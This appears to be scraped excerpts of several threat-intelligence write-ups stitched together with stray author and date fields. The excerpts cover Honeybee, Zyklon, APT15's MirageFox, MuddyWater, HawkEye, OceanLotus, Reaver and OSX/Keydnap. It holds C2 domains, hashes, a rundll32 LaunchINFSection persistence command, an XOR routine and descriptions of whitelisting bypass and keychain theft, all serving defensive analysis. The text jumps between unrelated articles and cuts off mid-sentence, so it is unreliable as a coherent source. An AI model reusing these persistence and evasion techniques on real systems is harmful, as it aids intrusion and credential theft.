the same Visual Basic macro code and author name as Honeybee Some of the malicious documents were test files without the implant From our analysis, most these documents were submitted from South Korea, indicating that some of the targeting was in South Korea We also observed a related malicious document created January 12 by the author Windows User that contained a different encoding key, but essentially used the same macro and same type of implant as we saw with the recent Honeybee documents This document, \u201cInternational Federation of Red Cross and Red Crescent Societies \u2013 DPRK Country Office,\u201d drops an implant with the control server address 1113427185.ifastnet.org, which resolves to the same server used by the implants dropped in the Honeybee case The directory contents of control server 1113427185.ifastnet.org The directory contents of ftp.byethost11.com, from Honeybee samples Log files of compromised machines from February 2018 Honeybee samples MaoCheng Dropper Aside from finding the malicious documents, the Advanced Threat Research team discovered a Win32-based executable dropper This dropper uses a stolen digital signature from Adobe Systems This certificate is also used by another Korean-language malware compiled January 16 (hash: 35904f482d37f5ce6034d6042bae207418e450f4) with an interesting program database (PDB) path D:\\Task\\DDE Attack\\MaoCheng\\Release\\Dropper.pdb The malware is a Win32 executable that pretends to be a Word document based on its icon This is a dropper for the same type of malware as observed with the other Word documents This sample also dropped a decoy document with the author name Honeybee This sample, however, contained a bug that interfered with the execution flow of the dropper, suggesting that the authors did not test the malware after code signing it The decoy document uses the cloud-based accounting software company Xero as a lure:  A decoy document from MaoCheng dropper Possible Operator  The Advanced Threat Research team has identified the following persona (snoopykiller@mail.ru) tied to this recent operation Based on our analysis, the actor registered two free hosting accounts: navermail.byethost3.com, which refers to the popular South Korean search engine, and nihon.byethost11.com The email address was used to register a free account for a control server in all the implants described in our analysis.\u00a0 Technical Analysis Let\u2019s start with an overview of the attack:  We continue with the components involved in this operation The malicious Word file is the beginning of the infection chain and acts as a dropper for two DLL files The Word file contains malicious Visual Basic macro code that runs when the document is opened in Word using the Document_Open() autoload function The word file also contains a Base64-encoded file (encoded with a custom key) in it that is read, decoded, and dropped to the disk by the macro The Document_Open() subroutine implementing the malicious functionality Decoding and writing the CAB file to %temp% The decoded CAB file in the Visual Basic memory buffer The DLL contains the following PDB path: D:\\Task\\MiMul\\NTWDBLIB\\Release\\NTWDBLIB.pdb Credentials are encoded in the .ini file Decoded credential data contained in ipnet.ini.\u00a0  dll: The malicious DLL file run as a service (using svchost.exe) The DLL contains the following PDB path: D:\\Task\\MiMul\\FTPCom_vs10\\Release\\Engine.pdb Immediately restart the service Remove the batch files to reduce the fingerprint on the system\u00a0  IPNet.dll runs as a service under svchost.exe This document was created January 10 Contents of the decoy document This variant also consists of two CAB files that are dropped to %temp%, depending on the OS (x86 or x64) Ipnet.dll may also be either 64-bit or 32-bit Similarities between this variant and the original malware sample:  Service name is the same: COMSysApp The DLL and ini files contain the same functions as described elsewhere in this post  Data Reconnaissance The following information is gathered from the endpoint and sent to the control server Writes new config info (control server connection info) to new ipnet.ini cmd /c put <new_file_name> <existing_file_name>: Copies existing file to new file name Furthermore, based on the various metadata in both documents and executables, the actor is likely a Korean speaker The techniques used in the malicious documents such as the lure messages closely resemble what we have observed before in South Korea The attacker appears to target those involved in humanitarian aid and inter-Korean affairs We have seen this operation expand beyond the borders of South Korea to target Vietnam, Singapore, Argentina, Japan, Indonesia, and Canada Some new droppers have not been observed before in the wild The MaoCheng dropper was apparently created specifically for this operation and appeared only twice in the wild", "Swapnil Patil", "July 26, 2018", "Microsoft Office Vulnerabilities

Introduction FireEye researchers recently observed threat actors leveraging relatively new vulnerabilities in Microsoft Office to spread Zyklon HTTP malware Zyklon has been observed in the wild since early 2016 and provides myriad sophisticated capabilities The malware may communicate with its command and control (C2) server over The Onion Router (Tor) network if configured to do so The malware can download several plugins, some of which include features such as cryptocurrency mining and password recovery, from browsers and email software Zyklon also provides a very efficient mechanism to monitor the spread and impact Infection Vector We have observed this recent wave of Zyklon malware being delivered primarily through spam emails The email typically arrives with an attached ZIP file containing a malicious DOC file (Figure 1 shows a sample lure) The following industries have been the primary targets in this campaign:  Telecommunications Insurance Financial Services     Figure 1: Sample lure documents Attack Flow  Spam email arrives in the victim\u2019s mailbox as a ZIP attachment, which contains a malicious DOC file The document files exploit at least three known vulnerabilities in Microsoft Office, which we discuss in the Infection Techniques section A visual representation of the attack flow and execution chain can be seen in Figure 2 Figure 6: PowerShell command to download the Pause.ps1 payload Dynamic Data Exchange (DDE) Dynamic Data Exchange (DDE) is the interprocess communication mechanism that is exploited to perform remote code execution With the help of a PowerShell script (shown in Figure 7), the next payload (Pause.ps1) is downloaded Figure 7: DDE technique used to download the Pause.ps1 payload One of the unique approaches we have observed is the use of dot-less IP addresses (example: hxxp://258476380) The Pause.ps1 script is responsible for resolving the APIs required for code injection It also contains the injectable shellcode The APIs contain VirtualAlloc(), memset(), and CreateThread() Figure 9 shows the decoded Base64 code Figure 9: Base64 decoded Pause.ps1 The injected code is responsible for downloading the final payload from the server (see Figure 10) The final stage payload is a PE executable compiled with .Net framework The unpacked code is Zyklon This file is decrypted and injected into an instance of InstallUtiil.exe, and functions as a Tor anonymizer Command & Control Communication The C2 communication of Zyklon is proxied through the Tor network The malware sends a POST request to the C2 server The C2 server is appended by the gate.php, which is stored in file memory The parameter passed to this request is getkey=y Figure 12: Zyklon public RSA key After the connection is established with the C2 server, the malware can communicate with its control server using the commands shown in Table 1 Zyklon Pricing Researchers identified different versions of Zyklon HTTP being advertised in a popular underground marketplace for the following prices:  Normal build: $75 (USD) Tor-enabled build: $125 (USD) Rebuild/Updates: $15 (USD) Payment Method: Bitcoin (BTC)  Conclusion Threat actors incorporating recently discovered vulnerabilities in popular software \u2013 Microsoft Office, in this case \u2013 only increases the potential for successful infections These types of threats show why it is very important to ensure that all software is fully updated Additionally, all industries should be on alert, as it is highly likely that the threat actors will eventually move outside the

May 07, 2019", "Article Content APT15 Background Coincidentally, following the recent hack of a US Navy contractor and theft of highly sensitive data on submarine warfare, we have found evidence of very recent activity by a group referred to as APT15, known for committing cyber espionage which is believed to be affiliated with the Chinese government The malware involved in this recent campaign, MirageFox, looks to be an upgraded version of a tool, a RAT believed to originate in 2012, known as Mirage APT15 is known for committing cyberespionage against companies and organizations located in many different countries, targeting different sectors such as the oil industry, government contractors, military, and more Other names for the group are Vixen Panda, Ke3chang, Royal APT, and Playful Dragon There are many articles and researches online about APT15 and their activities, the most recent one by NCC Group; although posted in March 2018, it refers to a campaign in 2017 After seeing that these binaries were new uploads to VirusTotal, with very few detections, we analyzed them using Intezer Analyze\u2122 to see if we could find any code reuse (https://analyze.intezer.com/#/analyses/d00b6787-0078-4148-aec3-a66779a22ba5) As can be seen in this code reuse analysis report (SHA256: 28d6a9a709b9ead84aece250889a1687c07e19f6993325ba5295410a478da30a), there is shared code with Mirage and Reaver The compilation timestamp is from June 8, 2018 while the upload date to VirusTotal was June 9, 2018 (VirusTotal) On VirusTotal, we can see there are only 10/66 detections for this binary, 11/66 for another similar version of MirageFox (SHA256: 97813e76564aa829a359c2d12c9c6b824c532de0fc15f43765cf6b106a32b9a5), and 9/64 for the third MirageFox binary that was uploaded (SHA256: b7c1ae10f3037b7645541acb9f7421312fb1e164be964ee7acd6eb1299d6acb2) Here\u2019s a couple examples of code reuse similarities found in the Mirage family between one of the newer binaries and older ones We are able to come up with a few very interesting conclusions about what is going on here, although we cannot say for sure what the case is without the full context Evidently in the image, you can see there is an exported function DLL hijacking techniques have been seen in the past with the APT15 group The problem here is that once the export is called the first time, the module renames itself to sqlsrver.dll and there is no evidence within the module of any type of persistence By renaming it to this, the future executions of the RAT will not be through a McAfee binary The future persistence could be setup through another component of the malware or even a command sent by the C&C to the infected computer If you read the report mentioned above about RoyalAPT by NCC Group, it is mentioned that APT15 infiltrated an organization again after stealing a VPN private key, therefore we can assume this version was tailor made to an organization they have already infiltrated and are connecting to the internal network using a VPN Then it sends this information to the C&C, opens a backdoor, and sits waiting for commands from the C&C with functionality such as modifying files, launching processes, terminating itself, and more functionality typically seen in APT15\u2019s RATs Conclusion There is high confidence that MirageFox can be attributed to APT15 due to code and other similarities in the MirageFox binaries As is known about APT15, after infiltrating their target, they conduct a lot of reconnaissance work, send the commands from the C&C manually, and will customize their malware components to best suit the environment they have infected IOCs MirageFox 28d6a9a709b9ead84aece250889a1687c07e19f6993325ba5295410a478da30a 97813e76564aa829a359c2d12c9c6b824c532de0fc15f43765cf6b106a32b9a5

East taking place between February and October 2017 by a group Unit 42 is naming \u201cMuddyWater\u201d This blog links this recent activity with previous isolated public reporting on similar attacks we believe are related We refer to these attacks as MuddyWater due to the confusion in attributing these attacks The MuddyWater attacks are primarily against Middle Eastern nations However, we have also observed attacks against surrounding nations and beyond, including targets in India and the USA MuddyWater attacks are characterized by the use of a slowly evolving PowerShell-based first\u00a0stage backdoor we call \u201cPOWERSTATS\u201d Despite broad scrutiny and reports on MuddyWater attacks, the activity continues with only incremental changes to the tools and techniques Introduction & Overview The Palo Alto Networks Unit 42 research team recently came across a series of malicious files which were almost identical to those targeting the Saudi Arabian government previously discussed by MalwareBytes Which in turn, closely resembles a previous article by Morphisec These attacks have also been tracked by several other researchers on Twitter and elsewhere The activity has been consistent throughout 2017 and, based on our analysis, targets or is suspected to target, entities in the following countries:  Saudi Arabia Iraq Israel United Arab Emirates Georgia India Pakistan Turkey USA  The malicious documents were adjusted according to the target regions, often using the logos of branches of local government, prompting the users to bypass security controls and enable macros An overview of the technical changes seen in the past year is given in the graphic below, note that raw IOCs present in this graphic can be found as text in the Appendix at the end of this article Figure 1 An overview of the delivery of POWERSTATS, C2 URLs used, and other changes in the malware  MuddyWater in the Middle East The attackers behind MuddyWater have been active throughout 2017, with targets across the Middle East and surrounding areas,\u00a0examples of the decoy documents observed is given in Table 1 Of course, being named in a decoy document doesn\u2019t mean any of these organizations have been attacked themselves or are involved in the attacks: the MuddyWater actors are abusing the trust these organizations\u2019 names and/or logos command for their malicious purposes All of these documents we observed and outlined above are related via:  Shared C2 infrastructure Shared attributes of the malicious documents used in attacks Shared attributes as to how the documents were delivered Based on these connections we can be confident that all the files and infrastructure we give in our appendices are related, since more than one of these can be used to link each of the samples discussed in each case The tools used by the MuddyWater attackers have been well documented by the previously cited research and a common theme of previous reporting was the open source nature of much of the toolset used by MuddyWater: Meterpreter, Mimikatz, Lazagne, Invoke-Obfuscation etc", "In some of their recent attack documents, the attackers also used GitHub as a hosting site for their custom backdoor, POWERSTATS The POWERSTATS malware was compiled as an exe using PS2EXE However, this was a minor anomaly, as it was only seen in this case: raw scripts being used in all other cases Pwn one to pwn them all In some of the instances we observed what appeared to be compromised accounts at third party organizations sending the malware In one case, the attackers sent a malicious document which was nearly identical to a legitimate attachment which we observed later being sent to the same recipient FIN7 is a threat actor group that is financially motivated with targets in the restaurant, services and financial sectors Following the trail of existing public reporting, the tie to FIN7 is essentially made based on a download observed from a MuddyWater C2, of a non-public tool \u201cDNSMessenger\u201d For example, Morphisec wrote: \u201cLater in our investigation, the same command server also delivered a variant of the DNS messenger similar to that described by Talos The use of the DNSMessenger tool appears primarily linked to FIN7, with no other samples being attributable to MuddyWater This led us to query the relationship between the newer attacks we were looking at and the alleged FIN7 link As part of this research, we came up with the following hypotheses along with their likelihoods, and a rationale for each one 1) The FIN7 threat actor is also involved in espionage in the Middle East \u2013 Unlikely Whilst this may seem an attractive hypothesis to some, there are aspects on the technical side that simply don\u2019t add up Primarily, there are significant disparities between FIN7 and MuddyWater, specifically in terms of:  Malware unique to FIN7, or commonly used by them has not yet been seen in any MuddyWater investigations (except for the single observation of the DNSMessenger sample) Other non-public malware and tools used by MuddyWater have not been observed in our FIN7 investigations 2) The DNSMessenger malware is a shared tool, used by FIN7, MuddyWater and perhaps other groups \u2013 Unlikely We have attempted to find examples of code available in public data sources that would generate the variation of the DNSMessenger malware and had little luck in doing so Even though the code for DNSMessenger is publicly available following research into attackers published by 3rd parties, attackers would have to write the corresponding server side to use it, and as such they may well choose to use the public DNS_TXT_Pwnage.ps1 script instead Despite this, based on the chain of analysis above we cannot discount the notion that DNSMessenger is shared by multiple attackers, including FIN7 and MuddyWater 3) There was a mistake in the original Morphisec analysis which linked these attacks to FIN7 \u2013\u00a0 Possible Little detail is given on the nature of how the connection between DNSMessenger and MuddyWater was discovered it isn\u2019t possible for us to verify this link 4) The attackers realized they were under investigation and planted a false flag \u2013 Possible The attackers realized they were under investigation and planted a false flag on their C2 server, uploading a copy of the FIN7 DNSMessenger code which had been previously mentioned (and was since publicly available) by FireEye and delivering it to researchers to trick them into mis-attributing the campaign Indeed, the sample shared by Morphisec on PasteBin is identical to the one dropped by the sample discussed in the FireEye FIN7 SEC campaign blog except for the final line Final thoughts Whilst we could conclude with confidence that the attacks discussed in this article are not FIN7 related, we were not able to answer many of our questions about the MuddyWater attacks We are currently unable to make a firm conclusion about the origin of the attackers, or the specific types of information they seek out once on a network In any case we will continue to track their activities to provide protections for our customers We hope the analysis presented shows the importance of drawing your own conclusions based on the data available to you, not just taking the conclusions given in the public domain at face value This is especially true when actors who rely on slightly modified (and publicly available) open source tools are in play Copycat threat actors can easily mimic attackers who use open source tools which can confuse attribution efforts meaning more than one aspect of the attacks observed must be considered when clustering On top of this, whilst the vast majority of threat analysis in the public domain is repeatable and correct, in some cases it can be difficult to verify the analysis available When it is hard to reproduce the analysis the confidence in any conclusions drawn must be lower than it would otherwise be, since you cannot know for sure that what is stated is true Palo Alto Networks customers are protected from this threat in the

according to past telemetry However, the group behind MuddyWater has been known to target other countries in the Middle East, Europe and the US We recently noticed a large amount of spear phishing documents that appear to be targeting government bodies, military entities, telcos and educational institutions in Jordan, Turkey, Azerbaijan and Pakistan, in addition to the continuous targeting of Iraq and Saudi Arabia, other victims were also detected in Mali, Austria, Russia, Iran and Bahrain", "These new documents have appeared throughout 2018 and escalated from May onwards The attacks are still ongoing The new spear-phishing docs used by MuddyWater rely on social engineering to persuade users to enable macros The attackers rely on a range of compromised hosts to deliver their attacks In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers\u2019 arsenal but also some OPSEC mistakes made by the attackers The initial infection vector The initial infection starts with macro-enabled Office 97-2003 Word files whose macros are usually password-protected to hinder static analysis In some cases, the malicious macro is also executed when the user activates a fake text box The macro payload analysis, dropped files and registry keys The macro payload, which is Base64 encoded, does the following:  Drops two or three files into the \u201cProgramData\u201d folder \\EventManager.dll \\EventManager.logs \\WindowsDefenderService.inil   Adds a registry entry in the current user\u2019s RUN key (HKCU) for later execution when the user next logs in In some cases, the macro spawns the malicious payload/process instantly without waiting for the next time the user logs in The registry keys and executables may vary from one version of the malware to another Name:WindowsDefenderUpdater Type:REG_EXPAND_SZ Data:c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,  The next time the user logs in, the dropped payload will be executed The executables have been chosen specifically for bypassing whitelisting solutions since they are all from Microsoft and very likely whitelisted Case 1: INF, SCT and text files dropped by the macro  INF is launched via the advpack.dll \u201cLaunchINFSection\u201d function INF registers the SCT file (scriptlet file) via scrobj.dll (Microsoft Scriptlet library) The resulting code has multiple layers of obfuscation The first thing the PowerShell code does is to disable office \u201cMacro Warnings\u201d and \u201cProtected View\u201c This is to ensure future attacks don\u2019t require user interaction The names are linked to various tools used by malware researchers CnC communication A URL is selected at random from a long list of embedded URLs held in an array named $dragon_middle The selected URL is subsequently used for communication with the CnC server If it can\u2019t send data to the chosen CnC URL, it tries to obtain another random URL from $middle_dragon, then sleeps from one to 30 seconds and loops again This allows the attackers to accept or reject victims depending on their IPs, countries, geolocations, target enterprises, etc Depending on the response from the attacker\u2019s CnC, the victim is assigned an ID $sysid These commands vary from one version to another The \u201cOutlook\u201d command receives another stage of the PowerShell code, saves it in \u201cc:\\programdata\\a.ps1\u201d and then asks Outlook via COM, via MSHTA.exe, to execute it The \u201crisk\u201d command receives another stage of the PowerShell code, saves it in \u201cc:\\programdata\\a.ps1\u201d and then asks Explorer.exe via COM interaction to execute it The \u201cclean\u201d command destroys the victim\u2019s disk drives C, D, E, F and then reboots The \u201creboot\u201d and \u201cshutdown\u201d commands immediately reboot and shut down the victim\u2019s machine Victimology  Most victims of MuddyWater were found in Jordan, Turkey, Iraq, Pakistan, Saudi Arabia, Afghanistan and Azerbaijan Other victims were also recorded in Russia, Iran, Bahrain, Austria and Mali The malicious decoy documents used in the attacks suggest they are geopolitically motivated, targeting sensitive personnel and organizations Multiple documents used in the attacks also contain embedded paths from their authors\u2019 machines These paths are embedded by Office under various circumstances, for instance, when somebody adds a binary object (an OLE control, e.g text box or command button) into a Word document Turk could point to a person of Turkish origin Poopak is a Persian girl\u2019s name or might suggest the authors are not entirely happy with \u201cPak\u201d, which could be short for Pakistan Leo could be one of the attacker\u2019s names We also don\u2019t rule out the possibility of false flags, with the attackers using random usernames to confuse researchers In multiple instances, we have also found Chinese text inside the samples, possibly indicating the reuse of code by the attackers

access local computer register Task Scheduler access denied  Translation of Chinese text We have also noticed that for some samples, e.g 5a42a712e3b3cfa1db32d9e3d832f8f1, the PowerShell code had only three CnC URLs, which leads us to believe that most of the CnC URLs in $dragon_middle found in other samples could actually be \u2018noise\u2019 to distract researchers or trigger false positives The best way to prevent attackers from finding and leveraging security holes, is to eliminate the holes altogether, including those related to improper system configurations or errors in proprietary applications Organizations are also recommended to implement the following steps for an enhanced level of protection at their premises Use PowerShell Constrained Language Mode as it uses IEX, Add-Type, and New-Object A whitelisting solution to prevent certain process child-parent execution hierarchies Conclusion The MuddyWaters group has carried out a large number of attacks and demonstrated advanced social engineering, in addition to the active development of attacks, infrastructure and the use of new methods and techniques The attackers are actively improving their toolkit in an effort to minimize their exposure to security products and services Kaspersky Lab expects these types of attacks to intensify in the near future In order to protect your company from malware, Kaspersky Lab researchers recommend implementing the following measures:  Educate generic staff to be able to distinguish malicious behavior like phishing links Educate information security staff to have full configuration, investigative and hunting abilities Use a proven corporate-grade security solution in combination with anti-targeted attack solutions capable of detecting attacks by analyzing network anomalies Provide security staff with access to the latest threat intelligence data, which will arm them with helpful tools for targeted attack prevention and discovery, such as indicators of compromise and YARA rules Make sure enterprise-grade patch management processes are well established and executed High-profile organizations should have elevated levels of cybersecurity, attacks against them are inevitable and are unlikely to ever cease Further details about the attackers\u2019 arsenal, additional indicators of compromise, YARA rules and attribution information is available

encoded files on disk The threat actor sells the card data or uses it for fraudulent purchases In the September 2016 incident, SecureWorks analysts observed card data being collected by the NetWire RAT instead of traditional POS malware The attack methodology is very similar to traditional POS malware A threat actor sends a phishing email with a malicious attachment to an employee working on a POS computer If the employee opens the attachment, malware to harvest card data is downloaded or installed Without proper security protections in place, these infections can remain undetected for months or years Keyloggers expose more than just card data; credentials for online accounts and applications such as email, property management systems (PMS), and Internet browsers are at risk Other sensitive information typed by the user, including Social Security numbers, phone numbers, addresses, and birthdates, can also be compromised Using a RAT with keylogging capabilities, a threat actor

world for a long time The emergence of the greyware market and the increased commercialization of keyloggers, stealers, and remote access trojans (RATs) has magnified this threat by reducing the barrier to entry for attackers In many cases, the adversaries leveraging these tools do not need to possess programming skills or in-depth computer science expertise, as they are now being provided as commercial offerings across the cybercriminal underground We have previously released in-depth analyses of these types of threats and how malicious attackers are leveraging them to attack organizations with\u00a0Remcos in August and Agent Tesla in October.HawkEye is another example of a malware kit that is actively being marketed across various hacking forums Over the past several months, Talos observed ongoing malware distribution campaigns attempting to leverage the latest version of the HawkEye keylogger/stealer, HawkEye Reborn v9, against organizations to steal sensitive information and account credentials for use in additional attacks and account compromise History of HawkEyeHawkEye is a malware kit that has been around for several years and has seen continuous development and iterations since at least 2013 It features robust stealing capabilities as it can be used to obtain sensitive information from a variety of different applications Talos has recently identified several changes concerning HawkEye Reborn in the latest version, HawkEye Reborn v9 The exploit works similarly to what we saw with Agent Tesla in October It leverages a buffer overflow in the Equation Editor, which occurs if someone hands over a font name that's too long The shellcode starts after the MTEF font tag \"08 13 36\" in this case.After execution in the Equation Editor (EQNEDT32.EXE) context, it downloads the malicious data from the malware server as you can see in the ThreatGrid Process Timeline screenshot below After a successful download, it creates and starts the RegAsm.exe process.This RegAsm.exe process is a heavily obfuscated AutoIT script compiled into a PE It first creates the \"winrshost\" mutex Then, it extracts the final payload malware from two objects in the PE resource section (capisp1, appsruprov2).It concatenates them and uses AES to decrypt the result, using the hardcoded key \"pydbdio\u2026\" which is handed over to the DecryptData function (see above) The shellcode in HEXCODE1 is very similar to this RunPE example Version 9 is still using the well-known MailPassView and WebBrowserPassView freeware tools from Nirsoft to steal web and email passwords These tools are embedded in the PE file in the form of data which is decoded at runtime and added to the local resources They are starting an instance of vbc.exe via ProcessCreate, injecting the tool and resume the threat The stolen passwords are ending up in a temporary file, which is read in and added to the list of data to be exfiltrated HawkEye has been active across the threat landscape for a long time and will likely continue to be leveraged in the future as long as the developer of this kit can monetize their efforts While the Terms of Service have been written in an attempt to absolve the developer of any wrongdoing, it is actively leveraged by malicious adversaries Organizations should be aware of this and similar threats and deploy countermeasures such as Multi-Factor Authentication (MFA) solutions such as Duo, to help reduce the impact of credential theft within their environments", "Jaromir Horejsi (Threat Researcher)", "April 04, 2018", "New

SeaLotus, and Cobalt Kitty) OceanLotus was responsible for launching targeted attacks against human rights organizations, media organizations, research institutes, and maritime construction firms The attackers behind OSX_OCEANLOTUS.D target MacOS computers which have the Perl programming language installed The MacOS backdoor was found in a malicious Word document presumably distributed via email

or not Based on that, the GET_PROCESSPATH and GET_PROCESSNAME methods will decrypt the hardcoded path and filename where the backdoor should be installed Figure 6 The access permissions will then be changed to 0x1ed = 755, which is equal to u=rwx,go=rx Figure 7 This persistence file is also set to hidden with a randomly generated file date and time Figure 8 Meanwhile, runHandle is responsible for

C0 73, then the scrambled version is computed using the third parameter (0x10), which is treated as a DWORD Each quadruple of bytes is XOR-ed with it, as shown in example below Figure 17.\u00a0Parser::inByte method When scrambling one byte, the scrambler first determines if the byte value is odd or even If the value is odd, it adds the byte, along with one more randomly generated byte, to the array In the case of an even value, the randomly generated byte is added first, followed by the byte being added In the case above, the third parameter is \u20181\u2019 = 0x31, which is an odd number This means that it adds byte \u20181\u2019 and one randomly generated byte to the final scrambled array Figure 18.\u00a0Parser::inString method When scrambling a string, the scrambler generates a 5-byte long sequence First, it generates one random byte, followed by three zero bytes, one random byte, and finally, the byte with the length of the string Let\u2019s say we want to scramble string \u2018Mac OSX 10.12.\u2019 Its length is 13 = 0x0d, and the two random bytes are 0xf3 and 0x92.\u00a0 The final 5-byte sequence looks like F3 00 00 00 92 0D The original string is then XOR\u2019ed with the 5-byte sequence However, this key is also scrambled with operation XOR 0x13 followed by ROL 6 operation applied to each byte Figure 20 The scrambled AES256 key is marked green, while the encrypted computer info is marked red Other bytes are just randomly generated noise When the backdoor receives the response from the C&C server, the final payload needs to be decoded again in a similar manner via decryption and scrambling The received data from the C&C server include the following information:  HandlePP::urlRequest (/appleauth/static/cssj/N252394295/widget/auth/app.css)

discovered a new malware family we\u2019ve named \u201cReaver\u201d with ties to attackers who use SunOrcal malware SunOrcal activity has been documented to at least 2013, and based on metadata surrounding some of the C2s, may have been active as early as 2010 The new family appears to have been in the wild since late 2016 and to date we have only identified 10 unique samples, indicating it may be sparingly used Reaver is also somewhat unique in the fact that its final payload is in the form of a Control panel item, or CPL file To date, only 0.006% of all malware seen by Palo Alto Networks employs this technique, indicating that it is in fact fairly rare While we don\u2019t have information on the intended targets in this case, previous reports on this activity have identified targeting primarily among the \u201cFive Poisons\u201d which are movements the Chinese government perceives as dangerous They are:  Uyghurs, particularly those supporting East Turkestan independence Tibetans, particularly those supportive of Tibetan independence Falun Gong practitioners Supporters of Taiwan independence Supporters of Chinese democracy  The attackers used both families concurrently from late last year through November 2017 and there is some C2 infrastructure overlap between the two families, as well as links to historical reporting.\u00a0 We explore those ties and provide an in-depth analysis of the new malware below Reaver Malware Analysis To date, Palo Alto Networks Unit 42 has identified 10 unique samples and three distinct variants of a new malware family we have named \u201cReaver\u201d As such, we identify each variant as Reaver.v1, Reaver.v2, and Reaver.v3 The flow for Reaver is as shown:  Figure 1 Reaver execution flow diagram Reaver.v1 The earliest variant of Reaver begins by attempting to enable the SeDebugPrivilege privilege for the running process The malware proceeds to identify the file path of either the common startup folder, or the user\u2019s startup folder depending on if the SeDebugPrivilege privilege was obtained Reaver.v2 Reaver.v2 begins by attempting to enable the SeDebugPrivilege privilege for the running process At this stage the malware will identify the correct startup path using the same technique witnessed in earlier variants It will specifically load this CPL file via a call to the built-in Microsoft Windows \u2018control.exe\u2019 utility Reaver.v3 Like Reaver.v2, Reaver.v3 begins by attempting to enable the SeDebugPrivilege privilege for the running process In the event this is successful, the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\\services\\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\\microsoft\\credentials\\  Reaver.v3 proceeds to write an embedded Microsoft Cabinet (CAB) file to the following location:  %TEMP%\\winhelp.dat  This cabinet file is then extracted to the previously identified file path The contents of this cabinet file consist of a Microsoft Control Panel item with a filename of \u2018winhelp.cpl\u2019 Finally, the malware calls the \u2018winhelp.cpl\u2019 file in a new process via the following command:  control [path_previously_identified]\\winhelp.cpl   Reaver HTTP Payload The malicious CPL payload of Reaver has the following two exported functions:  CPlApplet DllEntryPoint  When the CPlApplet function is loaded, Reaver will initially determine if the SeDebugPrivilege privilege is able to be obtained The following example decrypted configuration is as follows:       00000000: 77 77 77 2E 74 61 73 68\u00a0\u00a064 71 64 78 70 2E 63 6F\u00a0\u00a0www.tashdqdxp.co00000010: 6D 00 00 00 00 00 00 00\u00a0\u00a000 00 00 00 00

  RA@10001=ole32.dllRA@10002=CoCreateGuidRA@10003=Shlwapi.dllRA@10004=SHDeleteKeyARA@10005=wininet.dllRA@10006=InternetOpenA[TRUNCATED]RA@10288=%s\\%sRA@10289=CMD.EXERA@10290=%s=RA@10311=\\%sctr.dllRA@10312=\\uc.datRA@10313=ChangeServiceConfig2ARA@10314=QueryServiceConfig2A     When the malware wishes to retrieve one of these decoded strings, it will simply call a function with an integer argument that is responsible for providing it For example, calling this function with an argument of \u201810001\u2019 would retrieve a string of \u2018ole32.dll\u2019 The DllEntryPoint function proceeds to attempt to obtain the SeDebugPrivilege privilege, and also calls WSAStartup for future network activity When the CPlApplet function is loaded, it will begin by decompressing an embedded configuration using the same compression algorithm used previously This may be either a campaign identifier, or perhaps a malware versioning string The malware proceeds to check to see if the original dropped malware file exists The following example Python code shows how this encryption takes place:       c = 0out = \"\"for d in data:\u00a0\u00a0out += chr((ord(d) ^ ((c % 256) + 92)) & 0xFF)\u00a0\u00a0c += 1     After this data is exfiltrated, the malware expects 8 bytes of data that contains two DWORDs These DWORDs contain both a major command and a sub-command Specifically, Reaver to date has used www.tashdqdxp[.]com for C2, which overlaps with www.weryhstui[.]com, another C2 used by SunOrcal samples during the same timeframe Both domains have resolved to 98.126.156[.]210 Several of those same SunOrcal samples were also using www.fyoutside[.]com as an additional C2.\u00a0 This led to further C2 ties within SunOrcal samples, to include samples beaconing to www.olinaodi[.]com; all of this is shown below in Figure 3 The latter has been previously reported in activity targeting Hong Kong democracy activists and that activity is in turn tied to a report targeting Tibetan, Hong Kong, and Taiwanese activists, and another blog about targeting Taiwanese activists Figure 3 Chart showing overlaps between Reaver and SunOrcal All IOCs are in the appendix at the end of this blog Conclusion The attackers behind SunOrcal, whose activity dates to at least 2013 and possibly 2010, remain active and are still developing new custom malware to use against their targets The new malware, Reaver, appears to have been in the wild since late 2016 with less than a dozen known samples, among which there are three variants It is also unique in the fact that its final payload is in a CPL file, a technique which Palo Alto Networks has seen with only 0.006% of all malware samples we have analyzed The attackers used both families concurrently from late last year through November 2017 and there is some C2 infrastructure overlap between the two families, as well as links to historical reporting We will continue to monitor these attackers for new activity and report as appropriate Palo Alto Networks customers are protected by the following:  Wildfire and Traps

content of the keychain while maintaining a permanent backdoor ESET analyzes multiple samples targeting OS X every day Those samples are usually potentially unwanted applications\u00a0that inject advertisements into browser displays while the victim is browsing the web For the last few weeks, we have been investigating an interesting case where the purpose of the malware is to steal the content of the keychain and maintain a permanent backdoor This article will describe the components of this threat and what we know about it so far Infection vector It is still not clear how victims are initially exposed to OSX/Keydnap It could be through attachments in spam messages, downloads from untrusted websites or something else What we know is that a downloader component is distributed in a .zip file The archive file contains a Mach-O executable file with an extension that looks benign, such as .txt or .jpg However, the file extension actually contains a space character at the end, which means double-clicking the file in Finder will launch it in Terminal and not Preview or TextEdit Figure 1: Finder window with the ZIP and the malicious \u201c.jpg \u201d file Figure 2: The downloader\u2019s file information window The ZIP also contains the Resource fork that contains the icon of the executable file Once started, a Terminal window opens and the malicious payload is executed Notice the Terminal icon shows for a fraction of a second before opening Preview OSX/Keydnap downloader The downloader is an unsigned Mach-O executable Thus, if the file is downloaded from an internet browser and Gatekeeper is activated on the machine \u2013 the default in recent versions of OS X and macOS \u2013 it will not execute and display a warning to the user Figure 4: Message shown if ZIP\u00a0file is downloaded from Safari Keydnap\u2019s downloader is simple The downloader isn\u2019t persistent However, the downloaded backdoor will add an entry to the LaunchAgents directory and survive across reboot It is described in more details in the backdoor section We have found multiple variants of the downloader executable A list of different samples can be found at the end of the article This suggests that Keydnap may be targeting users of underground forums or maybe even security researchers Also included in recent variants is a \u201cbuild name\u201d We have seen three different names: elitef*ck, ccshop and transmission Figure 5: Example decoy image (1) Figure 5: Example decoy image (2) Figure 5: Example decoy image (3) OSX/Keydnap backdoor All samples of the backdoor we have seen have the filename icloudsyncd The malware has a version string that is reported to the C&C server So far, we have seen two versions: 1.3.1 first seen in May 2016\u00a0and 1.3.5 in June While self-decompressing, the XOR is applied after decompression and before calling the main function of the original binary The Library/Application Support/com.apple.iCloud.sync.daemon directory is used to keep the icloudsyncd executable With administrator privileges, it will also change the owner of icloudsyncd to root:admin and make the executable setuid and setgid, which means it will always run as root in the future The author simply took a proof-of-concept example available on Github called Keychaindump It reads securityd\u2019s memory and searches for the decryption key for the user\u2019s keychain This process is described in a paper 